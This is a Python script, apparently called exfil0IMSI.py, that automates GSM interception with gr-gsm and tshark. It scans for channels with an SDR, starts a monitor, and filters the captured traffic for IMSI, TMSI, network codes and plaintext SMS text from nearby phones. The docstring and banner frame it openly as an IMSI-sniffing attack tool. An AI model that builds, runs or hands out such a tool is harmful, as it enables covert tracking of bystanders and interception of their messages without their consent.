#!/usr/bin/env python3
"""
GSM Wizard (Headless) - Hacker-Style UI

This script:
 1) Terminates leftover processes on port 4729
 2) Checks/install python3, gr-gsm, tshark
 3) Lets you pick SDR device
 4) Runs grgsm_scanner -> parse ARFCN/freq
 5) Let user pick channel
 6) Launch grgsm_livemon_headless (or fallback) in background
 7) Run TShark line-buffered in the foreground
 8) Kill livemon on exit

Hackerish look & feel with ASCII art and green text.

Usage:
  sudo python3 exfil0IMSI.py

If you see "Address already in use", port 4729 is locked.
If no lines appear, phone might not be forced to 2G or is quickly re-assigning TMSI.
"""

import subprocess
import sys
import re
import os
import time

# Hacker-ish ANSI codes (green text on black style).
RESET  = "\033[0m"
BOLD   = "\033[1m"
GREEN  = "\033[92m"
RED    = "\033[91m"

def print_banner():
    """ Hacker-style ASCII banner. """
    print(f"{BOLD}{GREEN}")
    print("Evade the matrix. Sniff IMSI. Let's go...\n")

def kill_leftover_processes():
    """
    Kills leftover processes that bind to port 4729.
    """
    print(f"{GREEN}>>> Checking for leftover processes on port 4729...{RESET}")
    check_cmd = ["lsof", "-i", ":4729"]
    result = subprocess.run(check_cmd, capture_output=True, text=True)
    lines = result.stdout.strip().split("\n")

    if len(lines) > 1 and "PID" not in lines[0]:
        for line in lines[1:]:
            parts = line.split()
            if len(parts) >= 2:
                pid = parts[1]
                print(f"{RED}Kill leftover process PID={pid} using port 4729!{RESET}")
                subprocess.run(["sudo", "kill", "-9", pid], check=False)
        print()
    else:
        print("No leftover processes found.\n")

def check_or_install_deps():
    """
    Checks or installs python3, gr-gsm, tshark.
    """
    print(f"{GREEN}>>> Checking Dependencies...{RESET}")
    packages = ["python3", "gr-gsm", "tshark"]
    missing = []
    for pkg in packages:
        cmd = ["dpkg", "-s", pkg]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            missing.append(pkg)

    if missing:
        print(f"{RED}Missing packages:{RESET} {missing}")
        ans = input(f"{BOLD}Install them now via apt-get? [y/N]: {RESET}").strip().lower()
        if ans == "y":
            subprocess.run(["sudo", "apt-get", "update"])
            install_cmd = ["sudo", "apt-get", "install", "-y"] + missing
            subprocess.run(install_cmd)
        else:
            print("User declined installation. Exiting.\n")
            sys.exit(1)
    else:
        print("All required packages found!\n")

def pick_device():
    """
    User picks device from [RTL-SDR, HackRF, BladeRF].
    Returns dev arg: "rtl", "hackrf", "bladerf".
    """
    print(f"{GREEN}>>> Choose your weapon (SDR Device){RESET}")
    devices = [
        ("RTL-SDR",  "rtl"),
        ("HackRF",   "hackrf"),
        ("BladeRF",  "bladerf")
    ]
    for i, (name, dev) in enumerate(devices, start=1):
        print(f"{i}) {name}")

    choice = input("Pick device [1-3]: ").strip()
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(devices):
            raise ValueError()
    except ValueError:
        print("Invalid device choice. Exiting.\n")
        sys.exit(1)

    selected = devices[idx]
    print(f"{GREEN}Device chosen:{RESET} {selected[0]}\n")
    return selected[1]

def scan_for_channels(device_arg):
    """
    Runs 'grgsm_scanner --args <device_arg>'.
    Parse lines for ARFCN/freq. 
    """
    print(f"{GREEN}>>> Scanning GSM Band...{RESET}")
    cmd = ["grgsm_scanner", "--args", device_arg]
    print(f"Command: {' '.join(cmd)}")
    print("(Ctrl+C to abort scanning early)\n")

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    channels = []
    regex = re.compile(r"ARFCN:\s+(\d+),\s+Freq:\s+([\d\.]+[MG])")

    try:
        for line in process.stdout:
            line_s = line.strip()
            match = regex.search(line_s)
            if match:
                arfcn = match.group(1)
                freq  = match.group(2)
                channels.append((arfcn, freq))
                print(f"{GREEN}Found:{RESET} {line_s}")
    except KeyboardInterrupt:
        print("Scan aborted by user.\n")

    process.wait()
    err = process.stderr.read().strip()
    if err:
        print(f"{RED}[grgsm_scanner stderr]:{RESET}", err)
        if "Address already in use" in err:
            print("Port 4729 locked. Exiting.\n")
            sys.exit(1)

    return channels

def pick_channel(channels):
    """
    Prompt user to pick from discovered ARFCN/freq.
    """
    if not channels:
        print("No channels found. Exiting.\n")
        sys.exit(0)

    print(f"{GREEN}\n>>> ARFCNs discovered:{RESET}")
    for i, (arfcn, freq) in enumerate(channels, start=1):
        print(f"{i}) ARFCN={arfcn}, Frequency={freq}")

    choice = input("Which channel? ").strip()
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(channels):
            raise ValueError()
    except ValueError:
        print("Invalid channel selection. Exiting.\n")
        sys.exit(1)

    sel = channels[idx]
    print(f"{GREEN}Selected ARFCN={sel[0]}, freq={sel[1]}{RESET}\n")
    return sel

def run_livemon_headless(device_arg, freq_str):
    """
    Try 'grgsm_livemon_headless' or fallback to 'grgsm_livemon -p'.
    freq_str "925.2M" -> "925.2e6".
    """
    freq_e = freq_str.replace("M", "e6").replace("G", "e9")

    cmd_name = "grgsm_livemon_headless"
    check_cmd = ["which", cmd_name]
    result = subprocess.run(check_cmd, capture_output=True, text=True)

    if result.returncode != 0:
        print(f"{RED}grgsm_livemon_headless not found!{RESET} Falling back to 'grgsm_livemon -p'.")
        cmd_name = "grgsm_livemon"
        fallback_flags = ["-p"]
        cmd = [cmd_name, "--args", device_arg, "-f", freq_e] + fallback_flags
    else:
        cmd = [cmd_name, "--args", device_arg, "-f", freq_e]

    print(f"{GREEN}>>> Starting grgsm_livemon (headless) in bg...{RESET}")
    print("Command:", " ".join(cmd))
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setpgrp
    )
    time.sleep(2)
    print("grgsm_livemon launched. If signal is poor, no data might appear.\n")
    return proc

def run_tshark_capture():
    """
    TShark line-buffered capturing IMSI, MCC, MNC, TMSI, SMS.
    """
    print(f"{GREEN}>>> Launching TShark...{RESET}\n")
    cmd = [
        "tshark",
        "-i", "lo",
        "-f", "port 4729 and not icmp and udp",
        "-l",
        "-Y", "(e212.imsi or e212.mcc or e212.mnc or gsm_a.tmsi or gsm_sms.sms_text)",
        "-T", "fields",
        "-e", "frame.time",
        "-e", "e212.imsi",
        "-e", "e212.mcc",
        "-e", "e212.mnc",
        "-e", "gsm_a.tmsi",
        "-e", "gsm_sms.sms_text",
        "-E", "header=y",
        "-E", "separator=,",
        "-E", "quote=d"
    ]
    print("Command:", " ".join(cmd), "\n")

    with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1) as proc:
        try:
            for line in proc.stdout:
                print(line, end='')
        except KeyboardInterrupt:
            print(f"{RED}\nTShark interrupted by user.{RESET}")
            proc.terminate()

        proc.wait()
        err = proc.stderr.read().strip()
        if err:
            print(f"{RED}[TShark stderr]:{RESET}", err)

def main():
    print_banner()

    # 1) Kill leftover processes
    kill_leftover_processes()

    # 2) Check dependencies
    check_or_install_deps()

    # 3) Choose device
    dev_arg = pick_device()

    # 4) grgsm_scanner
    channels = scan_for_channels(dev_arg)

    # 5) pick channel
    (arfcn, freq) = pick_channel(channels)

    # 6) launch livemon headless
    livemon_proc = run_livemon_headless(dev_arg, freq)

    # 7) run TShark in foreground
    run_tshark_capture()

    # 8) kill livemon
    print(f"{RED}\nTerminating grgsm_livemon...{RESET}")
    try:
        livemon_proc.terminate()
    except:
        pass

    print(f"{GREEN}All done. Stay safe out there!{RESET}\n")

if __name__ == "__main__":
    main()
